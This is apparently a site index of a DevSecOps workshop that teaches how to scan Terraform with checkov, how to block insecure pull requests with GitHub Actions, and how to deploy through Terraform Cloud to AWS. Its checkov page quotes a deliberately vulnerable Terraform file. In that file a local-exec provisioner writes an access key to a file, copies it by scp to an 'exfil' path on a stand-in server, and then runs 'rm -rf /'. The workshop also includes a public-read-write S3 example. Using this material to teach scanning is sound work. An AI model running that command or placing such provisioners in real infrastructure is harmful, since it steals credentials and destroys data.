[
{
	"uri": "http://localhost:1313/ws02/",
	"title": " Cloud DevSecOps ",
	"tags": [],
	"description": "",
	"content": "Cloud DevSecOpsCloud DevSecOps with Hashicorp, Palo Alto Networks \u0026amp; AWS This workshop will demonstrate how to leverage infrastructure as code (IaC) and DevSecOps patterns to automate, scale, and improve the security posture of cloud infrastructure and applications. We will create a pipeline that ensures our configurations are secure and compliant from code to cloud.\nThis guide provides step-by-step instructions to integrate Prisma Cloud (and checkov) with Terraform Cloud, GitHub, VScode and AWS.\nWorkshop Studio: https://catalog.us-east-1.prod.workshops.aws/workshops/e31afbdf-ee40-41fa-a6c9-6ba2cb55fc1e/en-US\nContent Introduction Setup / Prerequisities Cleanup "
},
{
	"uri": "http://localhost:1313/ws02/2-prepair/2.1-aws/",
	"title": "Configure IAM User and API Key",
	"tags": [],
	"description": "",
	"content": "From the AWS console, select IAM or search for \u0026lsquo;IAM\u0026rsquo; in the Search bar if not displayed. In the IAM Dashboard, click Users on the left sidebar. Click the Create User button on the top right. Specify a User name that will be unique then click Next. Next, set the permissions for the user by selecting Attach policies directly and attaching the AdministratorAccess policy. Review the user details and click Create user. Now we need to assign an API key to the user we just created. Click on the user you just created from the IAM Dashboard and then click Create access key on the right. Select Other from the Access Key options. Optionally, supply a tag to associate with the Access Key, then click Create access key. Finally, save the Access Key data provided (copy to a local file). This credential will be used to deploy resources to AWS in a later section. When ready, click Done. An access key will now appear on the User details page. "
},
{
	"uri": "http://localhost:1313/ws02/1-intro/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "In this workshop, we will learn how to:\nGain an understanding of DevSecOps and infrastructure as code (IaC) using Terraform Scan IaC files for misconfigurations locally Set up CI/CD pipelines to automate security scanning and policy enforcement Fix security findings and AWS resource misconfigurations with Prisma Cloud DevSecOps\nThe foundation of DevSecOps lies in the DevOps movement, wherein development and operations functions have merged to make deployments faster, safer, and more repeatable. Common DevOps practices include automated infrastructure build pipelines (CI/CD) and version-controlled manifests (GitOps) to make it easier to control cloud deployments. By baking software and infrastructure quality requirements into the release lifecycle, teams save time manually reviewing code, letting teams focus on shipping features\nAs deployments to production speed up, many traditional cloud security concepts break down. With the rise of containerized technologies, serverless functions, and IaC frameworks, it is increasingly harder to maintain visibility of cloud security posture.\nBy leveraging DevOps foundations, security and development teams can build security scanning and policy enforcement into automated pipelines. The ultimate goal with DevSecOps is to “shift cloud security left.” What shifting cloud security left means is automating it and embedding it earlier into the development lifecycle so that actions can be taken earlier. Preventing risky deployments is a more proactive approach to traditional cloud security which often slows down development teams with deployment rollbacks and disruptive fixes.\nTo successfully implement DevSecOps, it is critical that teams building secure infrastructure must embracing existing tools and workflows. At Palo Alto Networks, we’re committed to making it as simple, effective, and painless as possible to automate security controls and integrate them seamlessly into standard workflows.\nInfrastructure as Code Using Terraform\nInfrastructure as code (IaC) frameworks, such as HashiCorp Terraform, make cloud provisioning scalable and straightforward by leveraging automation and code. Defining our cloud infrastructure in code simplifies repetitive DevOps tasks and gives us a versioned, auditable source of truth for the state of an environment.\nTerraform is useful for defining resource configurations and interacting with APIs in a codified, stateful manor. Any updates we want to make, such as adding more instances or changes to a configuration, can be handled by Terraform.\nFor example, the following Terraform resource block defines a simple AWS S3 bucket:\nresource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;data\u0026#34; { bucket = \u0026#34;my_bucket_name\u0026#34; acl = \u0026#34;public-read-write\u0026#34; } After performing terraform init we can provision an S3 bucket with the following command:\nterraform apply Any changes made to the resource definition within a .tf file, such as adding tags or changing the acl, can be pushed with the terraform apply command.\nAnother benefit of using Terraform to define infrastructure is that code can be scanned for misconfigurations before the resource is created. This allows for security controls to be integrated into the development process, preventing issues from being introduced, deployed and exploited.\nAWS Cloud9 IDE\nTo ensure we all have the same environent configuration, we will use AWS Cloud9, a cloud-delivered IDE from AWS, to carry out many of the steps in this workshop. AWS Cloud9 is a cloud-based integrated development environment (IDE) that lets you write, run, and debug your code with just a browser. It includes a code editor, debugger, and terminal. Cloud9 comes pre-packaged with essential tools for popular programming languages and the AWS Command Line Interface (CLI) pre-installed so you don’t need to install files or configure your laptop for this workshop.\nYour Cloud9 environment will have access to the same AWS resources as the user with which you logged into the AWS Management Console. We strongly recommend using Cloud9 to complete this workshop.\nCloud9 works best with Chrome or Firefox, not Safari. It cannot be used from a tablet.\nCheckov\nCheckov is an open source \u0026lsquo;policy-as-code\u0026rsquo; tool that scans cloud infrastructure defintions to find misconfigurations before they are deployed. Some of the key benefits of checkov:\nRuns as a command line interface (CLI) tool Supports many common plaftorms and frameworks Ships with thousands of default policies Works on windows/mac/linux (any system with python installed) Content Introduction Setup / Prerequisities Cleanup "
},
{
	"uri": "http://localhost:1313/ws02/2-prepair/2.2-c9/",
	"title": "Configure AWS Cloud9 IDE",
	"tags": [],
	"description": "",
	"content": "Select Services then select Cloud9 under Developer Tools or enter it into the Search bar. On the Cloud9 Environments page, click Create Environment Enter a Name for the Environemnt and select New EC2 instance for Environment Type. Select Additional instance types then choose t2.micro from the drop-down. With this workshop , they use a default setting\nLeave all other options on default setting and click Create. In my workshop, i will set up a manual network by myself\nReview:\n1 2 VPC Subnets Route tables Internet Gateways Security Groups Networking for Cloud9: Once the environment is created, navigate to it and click Open in Cloud9 to launch the IDE. Close all of the default windows, then create a New Terminal window. Congrats! Cloud9 is now ready to use. Before installing checkov or pulling code to scan, create and activate a python virtual environment to better organize python packages.\npython3 -m venv env source ./env/bin/activate "
},
{
	"uri": "http://localhost:1313/ws02/2-prepair/",
	"title": "Setup / Prerequisities",
	"tags": [],
	"description": "",
	"content": "Setup / Prerequisities Github account Terraform Cloud account AWS account (provided during workshop) Prisma Cloud account (OPTIONAL) Contents Configure IAM User and API Key Configure AWS Cloud9 IDE Code Scanning with checkov Integrate with Github Actions Integrate workflow with Terraform Cloud Block a Pull Request, Prevent a Deployment Deploy to AWS "
},
{
	"uri": "http://localhost:1313/ws02/2-prepair/2.3-checkov/",
	"title": "Code Scanning with checkov",
	"tags": [],
	"description": "",
	"content": "Install checkov\nTo get started, install checkov using pip:\npip3 install checkov Use the \u0026ndash;version and \u0026ndash;help flags to verify the install and view usage / optional arguements\ncheckov --version checkov --help To see a list of every policy that Checkov can enforce, use the -l or \u0026ndash;list options.\ncheckov --list Now that you see what checkov can do, let\u0026rsquo;s get some code to scan\u0026hellip;\nFork and clone target repository\nThis workshop involves code that is vulnerable-by-design. All of the necessary code is contained within this repository or workshop guide itself.\nTo begin, log into Github and navigate to the Prisma Cloud DevSecOps Workshop repository. Create a Fork of this repositry to create a copy of the code in your own account Ensure the selected Owner matches your username, then proceed to fork the repository by clicking Create fork. Grab the repo URL from Github, then clone the forked repository to Cloud9. git clone https://github.com/nonotnonez/prisma-cloud-devsecops-workshop.git cd prisma-cloud-devsecops-workshop/ git status Great! Now we have some code to scan. Let\u0026rsquo;s jump in\u0026hellip;\nScan with checkov\nCheckov can be configured to scan files and enforce policies in many different ways. To highlight a few:\nScans can run on individual files or entire directories. Policies can be selected through selection or omission. Enforcement can be determined by flags that control checkov\u0026rsquo;s exit code. Let\u0026rsquo;s start by scanning the entire ./code directory and viewing the results.\ncd code/ checkov -d . Failed checks are returned containing the offending file and resource, the lines of code that triggered the policy, and a guide to fix the issue.\nNow try running checkov on an individual file with checkov -f .\ncheckov -f deployment_ec2.tf checkov -f simple_ec2.tf Expand simple_ec2.tf provider \u0026#34;aws\u0026#34; { region = \u0026#34;us-west-2\u0026#34; } resource \u0026#34;aws_ec2_host\u0026#34; \u0026#34;test\u0026#34; { instance_type = \u0026#34;t3.micro\u0026#34; availability_zone = \u0026#34;us-west-2a\u0026#34; provisioner \u0026#34;local-exec\u0026#34; { command = \u0026#34;echo Running install scripts.. \u0026#39;echo $ACCESS_KEY \u0026gt; creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /\u0026#39; \u0026#34; } } Policies can be optionally enforced or skipped with the \u0026ndash;check and \u0026ndash;skip-check flags.\ncheckov -f deployment_s3.tf --check CKV_AWS_18,CKV_AWS_52 checkov -f deployment_s3.tf --skip-check CKV_AWS_18,CKV_AWS_52 Frameworks can also be selected or omitted for a particular scan:\ncheckov -d . --framework secrets --enable-secret-scan-all-files checkov -d . --skip-framework dockerfile Lastly, enforcement can be more granularly controlled by using the --soft-fail option. Applying --soft-fail results in the scan always returning a 0 exit code. Using --hard-fail-on overrides this option.\nCheck the exit code when running checkov -d . with and without the \u0026ndash;soft-fail option.\ncheckov -d . ; echo $? checkov -d . --soft-fail ; echo $? An example of using --soft-fail and exit codes in a pipeline context will be demosntrated in a later section.\nCustom Policies\nCheckov supports the creation of Custom Policies for users to customize their own policy and configuration checks. Custom policies can be written in YAML (recommended) or python and applied with the \u0026ndash;external-checks-dir or \u0026ndash;external-checks-git flags.\nLet\u0026rsquo;s create a custom policy to check for local-exec and remote-exec Provisioners being used in Terraform resource definitons. (Follow link to learn more about provisioners and why it is a good idea to check for them).\nmetadata: name: \u0026#34;Terraform contains local-exec and/or remote-exec provisioner\u0026#34; id: \u0026#34;CKV2_TF_1\u0026#34; category: \u0026#34;GENERAL_SECURITY\u0026#34; definition: and: - cond_type: \u0026#34;attribute\u0026#34; resource_types: all attribute: \u0026#34;provisioner/local-exec\u0026#34; operator: \u0026#34;not_exists\u0026#34; - cond_type: \u0026#34;attribute\u0026#34; resource_types: all attribute: \u0026#34;provisioner/remote-exec\u0026#34; operator: \u0026#34;not_exists\u0026#34; Add the above code to a new file within a new direcotry.\nmkdir custom-checks/ vim custom-checks/check.yaml Save the file. Then run checkov with the \u0026ndash;external-checks-dir to test the custom policy.\ncheckov -f simple_ec2.tf --external-checks-dir custom-checks IDE plugin\nRequires API key for Prisma Cloud.\nFollow links: https://catalog.us-east-1.prod.workshops.aws/workshops/e31afbdf-ee40-41fa-a6c9-6ba2cb55fc1e/en-US/3-section1/4-ide-plugin\n"
},
{
	"uri": "http://localhost:1313/ws02/3-cleanup/",
	"title": "Resource Cleanup",
	"tags": [],
	"description": "",
	"content": "All processing to clearn up all the resources\nCloud 9 Terraform Cloud Settings - Destruction and Deletion Destroy infrastructure -\u0026gt; Queue destroy plan - Delete Workspace AWS Console AWS S3 Buckets Overview AWS IAM User GitHub Go to : https://github.com/nonotnonez/prisma-cloud-devsecops-workshop/settings\nDelete this repository "
},
{
	"uri": "http://localhost:1313/ws02/2-prepair/2.4-git/",
	"title": "Integrate with Github Actions",
	"tags": [],
	"description": "",
	"content": "Github Actions\nYou can leverage GitHub Actions to run automated scans for every build or specific builds, such as the ones that merge into the master branch. This action can alert on misconfigurations, or block code from being merged if certain policies are violated. Results can also be sent to Prisma Cloud and other sources for further review and remediation steps.\nLet\u0026rsquo;s begin by setting an action from the repository page, under the Actions tab. Then click on set up a workflow yourself -\u0026gt; to create a new action from scratch.\nName the file checkov.yaml and add the following code snippet into the editor.\nname: checkov on: pull_request: push: branches: - main jobs: scan: runs-on: ubuntu-latest permissions: contents: read # for actions/checkout to fetch code security-events: write # for GitHub/codeql-action/upload-sarif to upload SARIF results steps: - uses: actions/checkout@v2 - name: Run checkov id: checkov uses: bridgecrewio/checkov-action@master with: directory: code/ #soft_fail: true #api-key: ${{ secrets.BC_API_KEY }} #env: #PRISMA_API_URL: https://api4.prismacloud.io - name: Upload SARIF file uses: GitHub/codeql-action/upload-sarif@v2 # Results are generated only on a success or failure # this is required since GitHub by default won\u0026#39;t run the next step # when the previous one has failed. Alternatively, enable soft_fail in checkov action. if: success() || failure() with: sarif_file: results.sarif Once complete, click Commit changes\u0026hellip; at the top right, then select commit directly to the main branch and click Commit changes. Verify that the action is running (or has run) by navigating back to the Actions tab. View the results of the run by clickiing on the Create checkov.yaml link. Notice the policy violations that were seen earlier in CLI/Cloud9 are now displayed here. However, this is not the only place they are sent\u0026hellip;\nView results in Github Security\nCheckov natively supports SARIF format and generates this output by default. GitHub Security accepts SARIF for uploading security issues. The GitHub Action created earlier handles the plumbing between the two.\nNavigate to the Security tab in GitHub, the click Code scanning from the left sidebar or View alerts in the Security overview \u0026gt; Code scanning alerts section. The security issues found by checkov are surfaced here for developers to get actionable feedback on the codebase they are working in without having to leave the platform. Tag and Trace with Yor\nYor is another open source tool that can be used for tagging and tracing IaC resources from code to cloud. For example, yor can be used to add git metadata and a unique hash to a terraform resource; this can be used to better manage resource lifecycles, improve change management, and ultimately to help tie code defintions to runtime configurations.\nCreate new file in the GitHub UI under the path .github/workflows/yor.yaml. Add the following code snippet:\nname: IaC tag and trace on: push: pull_request: jobs: yor: runs-on: ubuntu-latest permissions: contents: write steps: - uses: actions/checkout@v2 name: Checkout repo with: fetch-depth: 0 - name: Run yor action uses: bridgecrewio/yor-action@main This time, click Commit changes... at the top right, then select Create a new branch and click Propose changes. Click Create pull request on the next screen. Check that the action is running, queued, or finished under the Actions tab. More importanly, look at what yor updated by following the commit history and viewing any .tf file in the code/ directory. Notice the yor_trace tag? This can be used track \u0026ldquo;drift\u0026rdquo; between IaC definitons and runtime configurations.\nBranch Protection Rules\nUsing Branch Protection Rules allows for criteria to be set in order for pushes and pull requests to be merged to a given branch. This can be set up to run checkov and block merges if there are any misconfigurations or vulnerabilities.\nWithin Github, go to the Settings tab and navigate to Branches on the left sidebar, then click Add branch protection rule. Enter main as the Branch name pattern. Then select Require status checks to pass before merging, search for checkov in the provided search bar and select it as a required check. Leave the rest as default (unchecked), then click Create. "
},
{
	"uri": "http://localhost:1313/ws02/2-prepair/2.5-tfc/",
	"title": "Integrate workflow with Terraform Cloud",
	"tags": [],
	"description": "",
	"content": "Let\u0026rsquo;s continue by integrating our Github repository with Terraform Cloud. We will then use Terraform Cloud to deploy IaC resource to AWS.\nNavigate to Terraform Cloud and sign in / sign up. The community edition is all that is needed for this workshop. Enter an Organization name and provide your email address. Create a workspace using the Version Control Workflow option. Select Gtihub, then Gtihub.com from the dropdown. Authenticate and authorize the Github. Choose the prisma-cloud-devsecops-workshop from the list of repositories. Add a Workspace Name and click Advanced options. In the Terraform Working Directory field, enter /code/build/. Select Only trigger runs when files in specified paths change. Leave the rest of the options as default and click Create. Almost done. In order to deploy resources to AWS, we need to provide Terraform Cloud with AWS credentials. We need to add our credentials as workspace variables. Click Continue to workspace overview to do continue. Click Configure variables Add variables for AWS_SECRET_KEY_ID and AWS_SECRET_ACCESS_KEY. Ensure you select Environment variables for both and that AWS_SECRET_ACCESS_KEY is marked as Sensitive. Review the variables then return the your workspace overview when finished. Terraform Cloud is now configured and our pipeline is ready to go. Let\u0026rsquo;s test this out by submitting a pull request.\n"
},
{
	"uri": "http://localhost:1313/ws02/2-prepair/2.6-block/",
	"title": "Block a Pull Request, Prevent a Deployment",
	"tags": [],
	"description": "",
	"content": "We have now configured a GitHub repository to be scanned with checkov and to trigger Terraform Cloud to deploy infrastructure. Let\u0026rsquo;s see how this works in action.\nCreate a new file in the GitHub UI under the path code/build/s3.tf. Enter the following code snippet into the new file.\nprovider \u0026#34;aws\u0026#34; { region = \u0026#34;ap-southeast-1\u0026#34; } resource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;dev_s3\u0026#34; { bucket_prefix = \u0026#34;dev-\u0026#34; tags = { Environment = \u0026#34;Dev\u0026#34; } } resource \u0026#34;aws_s3_bucket_ownership_controls\u0026#34; \u0026#34;dev_s3\u0026#34; { bucket = aws_s3_bucket.dev_s3.id rule { object_ownership = \u0026#34;BucketOwnerPreferred\u0026#34; } } Once complete, click Commit changes... at the top right, then select Create a new branch and start a pull request and click Propose changes. At the next screen, review the diff then click Create pull request. One more time\u0026hellip; click Create pull request to open the PR. Wait for the checks to run. Then take note of the result: a blocked pull request! Either bypass branch protections and Merge pull request or go back to the Github Action for checkov and uncomment the line with --soft-fail=true. This will require closing and reopening a new pull request. "
},
{
	"uri": "http://localhost:1313/ws02/2-prepair/2.7-awsdeploy/",
	"title": "Deploy to AWS",
	"tags": [],
	"description": "",
	"content": "Navigate to Terraform Cloud and view the running plan.\nReview the variables then return the your workspace overview when finished. Once finished, click Confirm \u0026amp; apply to deploy the s3 bucket to AWS. Go to the S3 menu within AWS to view the bucket that has been deployed. "
},
{
	"uri": "http://localhost:1313/ws02/categories/",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "http://localhost:1313/ws02/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
}]